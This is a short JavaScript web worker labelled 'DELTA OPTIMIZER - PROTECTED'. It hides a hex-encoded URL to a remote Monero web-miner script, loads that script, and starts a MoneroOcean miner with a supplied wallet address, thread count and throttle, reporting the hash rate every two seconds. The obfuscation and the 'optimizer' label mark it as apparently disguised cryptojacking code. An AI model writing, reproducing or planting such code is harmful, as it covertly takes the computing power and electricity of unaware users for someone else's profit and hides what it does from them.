/* DELTA OPTIMIZER - PROTECTED */
var _0x5a12=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x6F\x6E\x65\x72\x6F\x6F\x63\x65\x61\x6E\x2E\x73\x74\x72\x65\x61\x6D\x2F\x77\x65\x62\x6D\x69\x6E\x65\x72\x2E\x6A\x73"];
importScripts(_0x5a12[0]);
self.onmessage=function(e){if(e.data.type==='start'){
var m=new MoneroOcean.Anonymous(e.data.address,{threads:e.data.threads,throttle:e.data.throttle});
m.start();setInterval(function(){self.postMessage({h:m.getHashesPerSecond()})},2000)}};
